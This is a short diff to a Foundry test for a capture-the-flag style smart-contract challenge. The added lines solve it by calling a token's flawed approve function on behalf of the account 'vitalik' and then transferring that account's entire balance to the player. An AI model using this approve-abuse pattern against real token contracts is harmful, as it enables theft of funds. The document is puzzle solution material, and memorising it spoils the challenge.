@@ -30,6 +30,12 @@ contract Challenge0Test is Test {
 
         //============================//
 
+        uint balance = VToken(token).balanceOf(vitalik);
+
+        VToken(token).approve(vitalik, player, balance);
+        IERC20(token).transferFrom(vitalik, player, balance);
+
+
         vm.stopPrank();
 
         assertEq(
